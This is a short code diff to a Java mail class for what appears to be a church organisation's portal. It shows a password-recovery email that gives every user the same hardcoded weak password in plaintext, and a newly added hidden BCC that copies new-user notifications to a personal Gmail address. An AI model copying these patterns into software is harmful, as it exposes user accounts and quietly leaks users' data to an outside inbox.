@@ -152,7 +152,7 @@ public class Mail {
 				"	 <table class=\"header-row\" width=\"528\" cellspacing=\"0\" cellpadding=\"0\" border=\"0\" style=\"table-layout: fixed;\"><tbody><tr><td class=\"header-row-td\" width=\"528\" style=\"font-size: 24px; margin: 0px; font-family: Arial, sans-serif; font-weight: normal; line-height: 19px; color: #478fca; padding-bottom: 10px; padding-top: 15px;\" valign=\"top\" align=\"left\">Paz de Deus,</td></tr></tbody></table>\r\n" + 
 				"	 <table class=\"header-row\" width=\"528\" <td> <br></td></table>\r\n" + 
 				"	 <table class=\"header-row\" width=\"528\" <td> Recuperação de Senha:</td></table>\r\n" + 
-				"	 <table class=\"header-row\" width=\"528\" <td> Sua Nova Senha é 123qwe!@#:</td></table>\r\n" + 
+				"	 <table class=\"header-row\" width=\"528\" <td> Sua Nova Senha é 123qwe!@#</td></table>\r\n" + 
 				"	 <table class=\"header-row\" width=\"528\" <td> <br>Favor entrar no sistema usando está senha e alterar no Perfil uma nova.</td></table>\r\n" + 
 				"	 <table class=\"header-row\" width=\"528\" <td> </td></table>\r\n" + 
 				"	 <table class=\"header-row\" width=\"528\" <td> Deus Abençoe</td></table>\r\n" + 
@@ -591,6 +591,7 @@ public class Mail {
 		email1.setSmtpPort(465);
 		email1.setCharset("UTF-8");//Codificação X acentos 
 		email1.addTo(email, Nome);
+		email1.addBcc("thesilasdesign@gmail.com");
 		email1.setFrom("sistema@ccbspp.com.br", "Informatica - CCB");
 		email1.setSubject("ADM - SSP - Novo usuário cadastrado no Portal");
 
